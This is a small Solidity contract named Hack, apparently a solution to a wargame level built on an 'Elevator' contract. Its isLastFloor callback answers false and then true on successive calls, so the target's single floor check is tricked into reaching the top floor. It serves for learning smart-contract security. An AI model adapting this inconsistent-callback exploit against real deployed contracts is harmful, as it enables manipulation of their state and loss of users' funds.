// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract Hack {
    Elevator private immutable target;
    uint private count;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function attack() external {
        target.goTo(1);
    }

    function isLastFloor(uint) external returns (bool) {
        count++;
        return count > 1;
    }
}
